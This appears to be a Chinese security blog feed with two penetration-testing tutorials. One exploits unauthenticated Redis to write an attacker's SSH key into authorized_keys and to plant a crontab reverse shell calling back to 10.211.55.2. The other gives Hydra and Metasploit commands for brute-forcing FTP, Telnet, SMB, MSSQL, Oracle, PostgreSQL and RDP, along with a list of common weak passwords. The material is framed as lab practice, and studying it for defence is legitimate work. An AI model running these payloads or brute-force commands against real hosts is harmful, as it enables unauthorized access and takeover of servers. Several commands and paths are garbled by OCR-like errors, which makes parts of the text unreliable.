src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5a0p1guc8j30m607fwh2.jpg" alt="image.png"></p><h4 id="配置公私钥"><a href="#配置公私钥" class="headerlink" title="配置公私钥"></a>配置公私钥</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成公私钥</span></span><br><span class="line">ssh-keygen</span><br><span class="line"></span><br><span class="line"><span class="comment">#到ssh公私钥放的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment">#将公钥的内容拷贝到authorized_keys文件中</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub &gt;&gt; authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭密码登陆</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PasswordAuthentication no&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启ssh</span></span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5a0uaaebvj30gy08u43b.jpg" alt="image.png"></p><p>将id-rsa拷贝到自己的机器上，用于连接SSH使用。<br>现在连接的效果如下:</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5a0voknidj30ma03uaau.jpg" alt="image.png"></p><p>客户端尝试公私钥登录:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将拷贝下来的私钥设置600权限</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ~/Downloads/ id_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用私钥登陆</span></span><br><span class="line">ssh -i ~/Downloads /id_rsa root@10.211.55.4</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5a0xfeb5cj30ma07ntbb.jpg" alt="image.png"></p><h4 id="模拟真实攻击"><a href="#模拟真实攻击" class="headerlink" title="模拟真实攻击"></a>模拟真实攻击</h4><div class="table-container"><table><thead><tr><th>攻击者</th><th>IP地址</th></tr></thead><tbody><tr><td>macOS本机</td><td>10.211.55.2</td></tr><tr><td>Kali Linux虚拟机</td><td>10.211.55.4</td></tr></tbody></table></div><p>Kali Linux虚拟机配置下Redis配置文件关闭IP地址绑定：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/root/redis-5.0.5</span><br><span class="line">$ vim redis.conf</span><br></pre></td></tr></table></figure><p>去掉ip绑定，允许除本地外的主机远程登录redis服务，需要注释掉如下内容:</p><p><code>bind 127.0.0.1</code></p><p>关掉保护模式:</p><p><code>protected-mode no</code></p><p>然后重启下Redis服务︰</p><p><code>./src/redis-server redis.conf</code></p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5a11ttbh2j30l50awq6w.jpg" alt="image.png"></p><p>首先攻击者先本地生成一对公私钥：</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5a13s09wkj30mc0hbwiv.jpg" alt="image.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#连接redis</span></span><br><span class="line">$ redis-cli -h 10.211.55.4 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看当前路径</span></span><br><span class="line">10.211.55.4:6379&gt; config get <span class="built_in">dir</span></span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot; / root/redis-5.0.5&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查看当前要操作的文件</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; config get dbfilename</span></span><br><span class="line"><span class="string">1) &quot;</span>dbfilename<span class="string">&quot;</span></span><br><span class="line"><span class="string">2 ) &quot;</span>dump.rdb<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#设置要操作的路径</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt;config set dir /root/.ssh/</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#设置要操作的文件</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; config set dbfilename authorized_keys</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查看设置好的路径</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; config get dir</span></span><br><span class="line"><span class="string">1) &quot;</span><span class="built_in">dir</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">2) &quot;</span>/root/.ssh<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查案设置好的文件</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; config get dbfilename</span></span><br><span class="line"><span class="string">1) &quot;</span>dbfilename<span class="string">&quot;</span></span><br><span class="line"><span class="string">2) &quot;</span>authorized_keys<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#写入公钥的值</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; set x &quot;</span>\n\n\nssh-rsa 公钥</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment">#将公钥的值保存到要操作的文件</span></span><br><span class="line">10.211.55.4:6379&gt;save</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="未授权访问弹-shell"><a href="#未授权访问弹-shell" class="headerlink" title="未授权访问弹 shell"></a>未授权访问弹 shell</h3><ul><li><strong>crontab 定时任务</strong><br>Python 实现T00ls自动签到脚本（邮件+钉钉通知)<br>Linux下使用原生的crontab命令实现定时任务了∶</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看定时任务</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑定时任务</span></span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>编辑定时任务，一行一个任务:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分时日月星期要运行的命令</span></span><br><span class="line">30 9 * * * /usr/bin/python3 /root/code/t00ls/TuBi.py&gt;&amp;1</span><br></pre></td></tr></table></figure><p>表示每天9:30自动运行下面的命令:</p><p><code>/usr/bin/python3 /root/ code/t00ls/TuBi.py</code></p><p>这样看起来是不是很简单呢，如果语法没有问题的话，会得到如下提示:</p><p><code>crontab: installing new crontab</code></p><p>这表示新建定时任务成功，后面就可以躺着赚去每天的2个TuBi了。</p><h3 id="crontab实例"><a href="#crontab实例" class="headerlink" title="crontab实例"></a>crontab实例</h3><ul><li><p><strong>实例1</strong>∶每1分钟执行一次myCommand</p><p><code>* * * * * myCommand</code></p></li><li><p><strong>实例2</strong>:每小时的第3和第15分钟执行</p><p><code>315 * * * * myCommand</code></p></li><li><p><strong>实例3</strong>:在上午8点到11点的第3和第15分钟执行</p><p><code>3,15 8-11 * * * myCommand</code></p></li><li><p><strong>实例4</strong>∶每隔两天的上午8点到11点的第3和第15分钟执行</p><p><code>3,15 8-11 */2 * * myCommand</code></p></li><li><p><strong>实例5</strong>:每周一上午8点到11点的第3和第15分钟执行</p><p><code>3,15 8-11 * * 1 myCommand</code></p></li><li><p><strong>实例6</strong>:每晚的21:30重启smb</p><p><code>30 21***/etc/init.d/smb restart</code></p></li><li><p><strong>实例7</strong>:每月1、10、22日的4:45重启smb</p><p><code>45 4 1,10,22 * * /etc/init.d/smb restart</code></p></li><li><p><strong>实例8</strong>:每周六、周日的1: 10重启smb</p><p><code>101 * * 6,0 /etc/init.d/ smb restart</code></p></li><li><p><strong>实例9</strong>:每天18:00至23 :00之间每隔30分钟重启smb</p><p><code>0,3018-23 * * * /etc /init.d /smb restart</code></p></li><li><p><strong>实例10</strong>:每星期六的晚上23 : 00重启smb</p><p><code>0 23 * * 6 /etc/init.d/smb restart</code></p></li><li><p><strong>实例11</strong>∶每一小时重启smb</p><p><code>* * /1 * * * / etc/init.d/smb restart</code></p></li><li><p><strong>实例12</strong>:晚上11点到早上7点之间，每隔一小时重启smb</p><p><code>0 23-7 * * * /etc/init.d/smb restart</code></p></li><li><p><strong>关于letc/crontab 及 /varlspool/cron/crontabs/$USER中定义的定时任务</strong></p><p>/etc/crontab只有 root 用户可以使用，使用时需 root 权限，而且必须指定运行用户，才会执行;</p><p><code>* * * * * root myCommand</code></p><p>/var/spool/cron/$USER 所有用户都可以使用，可以使用 crontab -u username -e 命令来直接编辑这个文件:</p><p><code>* * * * * myCommand</code></p></li></ul><p>Kali 的定时任务为 /var/spool/cron/crontabs/$USER shell 下有点问题，Ubuntu 16.10已将先前默认的 bashshell  更换为了 dashshell 。 Debian 和 Ubuntu 中，/bin/sh 默认已经指向 dash ，这是一个不同于 bash 的 shell ，它主要是为了执行脚本而出现，而不是交互，它速度更快，但功能相比 bash 要少很多，语法严格遵守 POSIX 标准。因为缺少了/bin/ls -bash 的交互特性，所以 kali 中弹不回 shell 可以得到很好的解释了。</p><p><code>ln -fs /bin/bash /bin/sh</code></p><h3 id="nc-命令教程"><a href="#nc-命令教程" class="headerlink" title="nc 命令教程"></a>nc 命令教程</h3><ul><li>nc 命令教程<br>nc被誉为网络安全界的瑞士军刀，<strong>一个简单而有用的工具</strong>，<strong>通过使用TCP或UDP协议的网络连接去读写数据</strong>。</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /ar/spool/ cron/ crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * */bin/bash -i &gt;&amp; / dev/tcp/10.211.55.2/2333 0&gt;&amp;1 \n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 - 系统认证漏洞</title>
      <link href="/post/14857.html/"/>
      <url>/post/14857.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h1><p>身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。计算机网络世界中一切信喜，包括用户的身份信息都是用一组特定的数据来表示的,计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。<br>身份认证攻击就是为了使用各种办法通过这层认证，<strong>突破作为防护网络资产的第一道关口</strong>，身份认证攻击在<strong>渗透测试</strong>中有着举足轻重的作用。<br>对于身份认证攻击可以直接进行爆破攻击，在配置不当的情况下内网中还会经常遇到非授权访问</p><h2 id="系统认证爆破"><a href="#系统认证爆破" class="headerlink" title="系统认证爆破"></a>系统认证爆破</h2><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><ul><li><strong>不怎么好用</strong><br><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></li></ul><p>俗称“九头蛇”，一款老牌的爆破工具</p><ul><li>常用命令</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FTP 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ftp:/ /192.168.0.1 -vV</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ssh: / /192.168.0.1 --vV</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB 爆破</span></span><br><span class="line">hydra -l admin -P password.txt 10.211.55.9 smb</span><br><span class="line"></span><br><span class="line"><span class="comment"># MSSQL 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P / root/password.txt 192.168.0.1 mssql -vv</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P / root/password.txt 192.168.0.1 mysql -vV</span><br></pre></td></tr></table></figure><ul><li>l：导入单个用户</li><li>L ：导入一个字典</li><li>p：导入一个密码</li><li>P：导入一个密码字典</li><li>Kali自带上述命令</li></ul><h4 id="SNETCracker"><a href="#SNETCracker" class="headerlink" title="SNETCracker"></a>SNETCracker</h4><ul><li>适合国情的内网爆破工具，安全从业者必备<br>超级弱口令检查工具是一款<strong>Windows平台的弱口令审计工具</strong>，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。</li></ul><blockquote><p>SSH登录发生异常! Could not load file or assembly ‘ChilkatDotNet4.dll’ or one of its dependencies.找不到指定的模块。这个错误是因为需要这个ssh模块需要vc++2010 32位得支持，下载安装就行了。RDP错误一般是<strong>线程</strong>过多，一般建议最好<strong>在10个以内</strong>，自己慢慢试，线程多了就会出问题。</p></blockquote><ul><li>支持 <strong>RDP</strong> 爆破 <strong>3389</strong><br>远程桌面协议RDP(Remote Display Protocol）是Windows的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到Windows计算机，默认端口为3389<br>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般 Windows 服务器陌默认账户为administrator此外如果对方服务器开启了SMB445端口的话尽量优先爆破SMB（445），因为<em>RDP协议比较脆弱，经不起高速的爆破</em>。</li></ul><h4 id="御剑RDP爆破工具"><a href="#御剑RDP爆破工具" class="headerlink" title="御剑RDP爆破工具"></a>御剑RDP爆破工具</h4><ul><li>较为好用 在 github 中下架时查找历史提交记录下载</li></ul><h4 id="railgun"><a href="#railgun" class="headerlink" title="railgun"></a>railgun</h4><p><a href="https://github.com/z520520/railgun">https://github.com/z520520/railgun</a></p><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><ul><li><strong>Kali Linux系统内置Metasploit</strong>，它可以帮助用户识别安全问题，验证漏洞，并对某些软件进行安全评估，提供安全风险情报</li><li><strong>RAPID7</strong>团队出品。<strong>Offensive Security</strong>团队</li></ul><h3 id="国内常见弱口令"><a href="#国内常见弱口令" class="headerlink" title="国内常见弱口令"></a>国内常见弱口令</h3><div class="table-container"><table><thead><tr><th>Col1</th><th>Col2</th><th>Col3</th><th>Col4</th></tr></thead><tbody><tr><td>123abc</td><td>P@sswOrd</td><td>Huawei@123</td><td>mysql</td></tr><tr><td>123abc*123</td><td>P@sswOrd</td><td>Changme_123</td><td>oracle</td></tr><tr><td>123456</td><td>root@123</td><td>admin@123</td><td>root</td></tr><tr><td>abc123root123</td><td>root1234</td><td>admin</td><td>test</td></tr><tr><td>abc123456</td><td>oracle123!@#</td><td></td></tr></tbody></table></div><h3 id="常见爆破服务及端口号总结"><a href="#常见爆破服务及端口号总结" class="headerlink" title="常见爆破服务及端口号总结"></a>常见爆破服务及端口号总结</h3><div class="table-container"><table><thead><tr><th>服务名称</th><th>端口号</th><th>服务名称</th><th>端口号</th></tr></thead><tbody><tr><td>FTP</td><td>21</td><td>MySQL</td><td>3360</td></tr><tr><td>Telnet</td><td>23</td><td>RDP</td><td>3389</td></tr><tr><td>SMB</td><td>445</td><td>PostgreSQL</td><td>5432</td></tr><tr><td>MSSQL</td><td>1433</td><td>Redis</td><td>6379</td></tr><tr><td>Oracle</td><td>1521</td><td>Tomcat</td><td>8080</td></tr><tr><td>MongoDb</td><td>27017</td><td></td></tr></tbody></table></div><h3 id="爆破-21-FTP"><a href="#爆破-21-FTP" class="headerlink" title="爆破 21 FTP"></a>爆破 21 FTP</h3><p>FTP(File Transfer Protocol，<strong>文件传输协议</strong>)是TCP/IP协议组中的协议之一。FTP协议包括两个组成部分，其一为<strong>FTP服务器</strong>，其二为<strong>FTP客户端</strong>。其中<strong>FTP服务器用来存储文件</strong>，用户司以使用<strong>FTP客户端通过FTP协议访问位于FTP服务器上的资源</strong>。</p><ul><li><strong>Docker快速搭建FTP环境:</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拉取镜像</span></span><br><span class="line">docker pull fauria/vsftpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#构建容器</span></span><br><span class="line">docker run -d \-p 20:20 \</span><br><span class="line">-p 21:21 \</span><br><span class="line">-p 21100-21110:21100-21110 \-e FTP_USER=admin \</span><br><span class="line">-e FTP_PASS=admin \</span><br><span class="line">-e PASV_ADDRESS=10.20.24.244 \<span class="comment"># Docker 宿主机的 IP</span></span><br><span class="line">-e PASv_MIN_PORT=21100 \</span><br><span class="line">-e PASV_MAX_PORT=21100 \</span><br></pre></td></tr></table></figure><ul><li>Hydra</li><li><strong>超级弱口令爆破工具</strong></li><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/ftp/ftp_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.20.24.244set username admin</span><br><span class="line"><span class="built_in">set</span> pass_file /Users/sec/Documents/Sec/ hydra/password.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-23-Telnet-比较少见"><a href="#爆破-23-Telnet-比较少见" class="headerlink" title="爆破 23 Telnet 比较少见"></a>爆破 23 Telnet 比较少见</h3><p>Telnet 协议是 Internet 远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机.工作的能力。用户连接上Telnet之后可以直接输入命令，然后这些命令会在服务器上运行，就像直接在控制器的控制台上输入一样。默认端口为23</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/telnet/telnet_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.211.55.9</span><br><span class="line"><span class="built_in">set</span> user_file /Users/sec/Documents/Sec/hydra/user.txt</span><br><span class="line"><span class="built_in">set</span> pass_file /Users/sec/Documents/Sec /hydra/password.txt</span><br><span class="line"><span class="built_in">set</span> threds 5   <span class="comment">#线程</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>坑点记录</strong><br>超级弱口令工具 和 Hydra 爆破 TeInet 不太行，尽量<strong>使用 MSF 爆破TeInet</strong></li></ul><h3 id="爆破-445-SMB"><a href="#爆破-445-SMB" class="headerlink" title="爆破 445 SMB"></a>爆破 445 SMB</h3><p>SMB(Server Message Block) Windows协议，用于<strong>文件和打印共享服务</strong>。默认端口为445</p><ul><li>Hydra</li><li>超级弱口令爆破工具</li><li>railgun</li><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner / smb /smb_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> smbuser admin</span><br><span class="line"><span class="built_in">set</span> pass_file /root/password.txt</span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>坑点记录</strong></li><li><ol><li>超级弱口令工具在爆破高版本系统比如Windows 10就不太好用:</li></ol></li><li><ol><li>Hvdra也不太行:</li></ol></li><li><ol><li>但是此时MSF依然是可以爆破的:</li></ol></li><li><ol><li>另外 SMB爆破还与防火墙是否关闭有关系，总的来说SMB爆破首选 MSF 爆破Samba也,是可以使用MSF或者Hvdra 来讲行爆破的:</li></ol></li><li><ol><li>爆破Samba也,是可以使用MSF或者Hvdra 来讲行爆破的:<br>Samba是种用来让UNIX系列的操作系统与微软Windows 操作系统的SMB网络协议做链接的自由软件。第三版不仅可访问及分享SMB的文件夹及打印机，本身还可以集成入Windows Server的网域，扮演为网域控制站以及加入Active Directory成员</li></ol></li><li><strong>Docker 快速搭建Samba环境:</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拉取镜像</span></span><br><span class="line">docker pull dpersoti/ samba</span><br><span class="line"></span><br><span class="line">docker run -it \</span><br><span class="line">--name brute_samba \     <span class="comment">#为新的容器命一个名，方便启动、停止、删除等操作，毕竟一长串字符不好输入</span></span><br><span class="line">-p 139:139 \   <span class="comment">#将主机的139端口映射到samba_docker这个容器的139端口上</span></span><br><span class="line">-p 445:445 \   <span class="comment">#将主机的445端口映射到samba_docker这个容器的445端口上</span></span><br><span class="line">-v/Users/sec/Downloads:/home/shares/shareA\   <span class="comment">#将主机上的共享目录向容器进行映射</span></span><br><span class="line">-d dperson/ samba l<span class="comment">#以dperson/ samba这个dockers镜像为模板，建立容器</span></span><br><span class="line">-w <span class="string">&quot;WORKGROUP&quot;</span> \   <span class="comment">#从这里开始是dperson/samba 的参数，上面是docker run的参数。这里指定了工作组</span></span><br><span class="line">-u <span class="string">&quot;admin ; 123456789&quot;</span>\   <span class="comment">#为samba服务设置账户和密码</span></span><br><span class="line">-s <span class="string">&quot;shareA; / home/shares/shareA; yes;no; no ; admin ;admin ; admin&quot;</span>   <span class="comment">#共享文件夹的名称;共享在samba容器中的路径;共享名称对所有工作组用户可见;不是只读(也就是说可写;不允许guest用户;指定共享的所有权用户;指定共享的超级用户;指定具有写权限的用户;</span></span><br></pre></td></tr></table></figure><h3 id="爆破-1433-MSSQL"><a href="#爆破-1433-MSSQL" class="headerlink" title="爆破 1433 MSSQL"></a>爆破 1433 MSSQL</h3><p>MSSQL是指微软<strong>的SQLServer数据库</strong>，默认端口为1433，默认最高权限用户为 sa，<strong>拿到 sa 用户权限的话，基本可以顺利提权拿到系统权限。</strong></p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/mssql/mssql_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> USERNAME sa</span><br><span class="line"><span class="built_in">set</span> PASS_FILE /root/password.txt</span><br><span class="line"><span class="built_in">set</span> THREADS 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-1521-Oracle"><a href="#爆破-1521-Oracle" class="headerlink" title="爆破 1521 Oracle"></a>爆破 1521 Oracle</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系<strong>数据库管理系统</strong>。<strong>默认端口为1521端口</strong>，和其他数据库不同的是，爆破前得先爆破对应的SID，不过<strong>SID很多都是默认的</strong>，可以使用MSF来进行爆破。</p><ul><li><strong>Metasploit 爆破SID</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/oracle/sid_brute</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>Metasploit爆破Oracle</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/oracle/oracle_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> RPORTS 1521</span><br><span class="line"><span class="built_in">set</span> SID xXX</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-3360-MySQl"><a href="#爆破-3360-MySQl" class="headerlink" title="爆破 3360 MySQl"></a>爆破 3360 MySQl</h3><p>MySQL是一个关系型<strong>数据库管理系统</strong>，默认端口为3306<br>爆破前检测是否<strong>开启</strong>数据库外连，不要做无意义的爆破，可以手动写Python 脚本来批量验证。</p><ul><li>同一个IP 在短时间内产生太多(超过mysql数据库max_connection_errors的最大值)中断的数据库连接而导致的阻塞</li><li>此时哪怕输入正确的密码也已经无济于事了，解决方法只能重启数据库:</li></ul><h3 id="爆破-3389-RDP"><a href="#爆破-3389-RDP" class="headerlink" title="爆破 3389 RDP"></a>爆破 3389 RDP</h3><p>远程桌面协议RDP(Remote Display Protocol ）是Windows的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到Windows计算机，默认端口为 3389<br>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般Windows服务器陌<em>默认账户为administrator</em> 此外如果对方服务器开启了SMB 445端口的话尽量优先爆破SMB，<strong>因为RDP协议比较脆弱,经不起高速的爆破</strong>。</p><h3 id="爆破-5432-PostgreSQL"><a href="#爆破-5432-PostgreSQL" class="headerlink" title="爆破 5432 PostgreSQL"></a>爆破 5432 PostgreSQL</h3><p>PostgreSQL 是一种<strong>对象-关系型数据库管理系统</strong>，默认端口为 5432 可以直接使用<strong>超级弱口令工具爆破</strong>也可以使用<strong>Metasploit</strong>来进行爆破</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/ postgres/postgres_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line">RPORTS 5432</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-6379-Redis"><a href="#爆破-6379-Redis" class="headerlink" title="爆破 6379 Redis"></a>爆破 6379 Redis</h3><ul><li>redis 默认没有密码<br>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的API。默认端口为6379<br>可以直接使用超级弱口令工具爆破也可以使用Metasploit:</li><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 